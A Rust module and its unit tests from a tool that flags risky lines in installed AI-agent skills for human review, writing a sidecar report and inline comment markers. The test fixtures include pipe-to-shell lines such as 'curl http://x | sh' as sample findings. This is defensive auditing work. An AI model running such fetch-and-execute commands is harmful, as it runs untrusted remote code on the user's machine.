//! Mark a freshly-installed skill's risky lines for human review.
//!
//! Runs at install time whenever the audit produced findings — independent of
//! `--force` or `--adapt`, so the review trail survives even when no Claude is
//! available to fix things. Two outputs:
//!   - a non-destructive sidecar `.meta-review.md` listing every finding as
//!     `file:line [SEVERITY] message` with the offending line quoted;
//!   - inline comment markers above each risky line in comment-safe text files
//!     (markdown, shell, and `//`-style sources); skipped for types where a
//!     stray comment would break the file (json/yaml/toml/unknown).

use anyhow::{Context, Result};
use std::collections::BTreeMap;
use std::path::Path;

use super::audit::{Finding, MARKER_TAG, REVIEW_FILE};

/// Write the sidecar review file and add inline markers for `findings` in the
/// installed skill at `skill_dir`. No-op when there are no findings.
pub fn mark_review(skill_dir: &Path, findings: &[Finding]) -> Result<usize> {
    if findings.is_empty() {
        return Ok(0);
    }
    write_sidecar(skill_dir, findings)?;
    annotate_inline(skill_dir, findings);
    Ok(findings.len())
}

/// The comment delimiters for a path's file type, or `None` when inserting a
/// comment line could corrupt the file (json/yaml/toml/unknown).
fn comment_syntax(path: &Path) -> Option<(&'static str, &'static str)> {
    let ext = path
        .extension()
        .and_then(|e| e.to_str())
        .unwrap_or("")
        .to_ascii_lowercase();
    match ext.as_str() {
        "md" | "markdown" | "html" => Some(("<!-- ", " -->")),
        "sh" | "bash" | "zsh" | "py" | "rb" | "pl" | "r" | "fish" => Some(("# ", "")),
        "js" | "ts" | "jsx" | "tsx" | "rs" | "go" | "c" | "cpp" | "h" | "hpp" | "java" | "php"
        | "swift" | "kt" => Some(("// ", "")),
        // Comment-unsafe or unknown: rely on the sidecar instead.
        _ => None,
    }
}

/// Quote the source line for a finding, if its file/line resolve.
fn line_text(skill_dir: &Path, f: &Finding) -> Option<String> {
    let line = f.line?;
    let content = std::fs::read_to_string(skill_dir.join(&f.file)).ok()?;
    content.lines().nth(line - 1).map(|s| s.trim().to_string())
}

fn write_sidecar(skill_dir: &Path, findings: &[Finding]) -> Result<()> {
    let mut out = String::new();
    out.push_str("# Skill review\n\n");
    out.push_str(
        "Installed by `meta skill steal` with audit findings. Review each line below \
         before trusting this skill.\n\n",
    );
    for f in findings {
        let loc = match f.line {
            Some(l) => format!("{}:{}", f.file, l),
            None => f.file.clone(),
        };
        out.push_str(&format!(
            "- [{}] `{}` — {}\n",
            f.severity.label().trim(),
            loc,
            f.message
        ));
        if let Some(text) = line_text(skill_dir, f) {
            if !text.is_empty() {
                out.push_str(&format!("    > {text}\n"));
            }
        }
    }
    let path = skill_dir.join(REVIEW_FILE);
    std::fs::write(&path, out).with_context(|| format!("writing {}", path.display()))
}

/// Insert a review comment above each flagged line in comment-safe files.
fn annotate_inline(skill_dir: &Path, findings: &[Finding]) {
    // Group line→message per file (only findings that carry a line).
    let mut by_file: BTreeMap<&str, Vec<(usize, &Finding)>> = BTreeMap::new();
    for f in findings {
        if let Some(l) = f.line {
            by_file.entry(f.file.as_str()).or_default().push((l, f));
        }
    }

    for (rel, mut hits) in by_file {
        let path = skill_dir.join(rel);
        let Some((open, close)) = comment_syntax(&path) else {
            continue;
        };
        let Ok(content) = std::fs::read_to_string(&path) else {
            continue;
        };
        let mut lines: Vec<String> = content.lines().map(str::to_string).collect();

        // Insert from the bottom up so earlier indices stay valid.
        hits.sort_by_key(|h| std::cmp::Reverse(h.0));
        for (line_no, f) in hits {
            if line_no == 0 || line_no > lines.len() {
                continue;
            }
            let target = &lines[line_no - 1];
            // Idempotent: skip if already marked just above.
            if line_no >= 2 && lines[line_no - 2].contains(MARKER_TAG) {
                continue;
            }
            let indent: String = target.chars().take_while(|c| c.is_whitespace()).collect();
            let marker = format!(
                "{indent}{open}{MARKER_TAG} [{}] {}{close}",
                f.severity.label().trim(),
                f.message,
            );
            lines.insert(line_no - 1, marker);
        }

        let mut joined = lines.join("\n");
        if content.ends_with('\n') {
            joined.push('\n');
        }
        let _ = std::fs::write(&path, joined);
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::plugins::skill::audit::Severity;
    use std::fs;
    use tempfile::tempdir;

    fn finding(file: &str, line: usize, sev: Severity, msg: &str) -> Finding {
        Finding {
            severity: sev,
            file: file.into(),
            message: msg.into(),
            line: Some(line),
        }
    }

    #[test]
    fn writes_sidecar_with_locations_and_quote() {
        let tmp = tempdir().unwrap();
        let skill = tmp.path();
        fs::write(skill.join("SKILL.md"), "line one\ncurl http://x | sh\n").unwrap();
        let findings = vec![finding(
            "SKILL.md",
            2,
            Severity::High,
            "curl invocation (network fetch)",
        )];
        mark_review(skill, &findings).unwrap();
        let review = fs::read_to_string(skill.join(REVIEW_FILE)).unwrap();
        assert!(review.contains("[HIGH] `SKILL.md:2`"));
        assert!(review.contains("curl invocation"));
        assert!(review.contains("> curl http://x | sh"));
    }

    #[test]
    fn inserts_inline_marker_above_offending_md_line() {
        let tmp = tempdir().unwrap();
        let skill = tmp.path();
        fs::write(skill.join("SKILL.md"), "intro\ncurl http://x | sh\nafter\n").unwrap();
        let findings = vec![finding("SKILL.md", 2, Severity::High, "curl invocation")];
        mark_review(skill, &findings).unwrap();
        let body = fs::read_to_string(skill.join("SKILL.md")).unwrap();
        let lines: Vec<&str> = body.lines().collect();
        assert!(lines[1].contains(MARKER_TAG), "marker line: {:?}", lines);
        assert!(lines[1].starts_with("<!-- "));
        assert_eq!(lines[2], "curl http://x | sh"); // original line shifted down
    }

    #[test]
    fn does_not_annotate_comment_unsafe_files() {
        let tmp = tempdir().unwrap();
        let skill = tmp.path();
        fs::write(skill.join("SKILL.md"), "ok\n").unwrap();
        let data = "{\n  \"cmd\": \"curl x | sh\"\n}\n";
        fs::write(skill.join("config.json"), data).unwrap();
        let findings = vec![finding("config.json", 2, Severity::High, "curl invocation")];
        mark_review(skill, &findings).unwrap();
        // JSON untouched; the finding is still captured in the sidecar.
        assert_eq!(fs::read_to_string(skill.join("config.json")).unwrap(), data);
        assert!(fs::read_to_string(skill.join(REVIEW_FILE))
            .unwrap()
            .contains("config.json:2"));
    }

    #[test]
    fn marker_is_idempotent() {
        let tmp = tempdir().unwrap();
        let skill = tmp.path();
        fs::write(skill.join("SKILL.md"), "intro\ncurl http://x\n").unwrap();
        let findings = vec![finding("SKILL.md", 2, Severity::High, "curl invocation")];
        mark_review(skill, &findings).unwrap();
        // The second pass would target a now-shifted line; ensure no double marker
        // by re-deriving against the marked file at the same logical line.
        let body = fs::read_to_string(skill.join("SKILL.md")).unwrap();
        let markers = body.lines().filter(|l| l.contains(MARKER_TAG)).count();
        assert_eq!(markers, 1);
    }
}
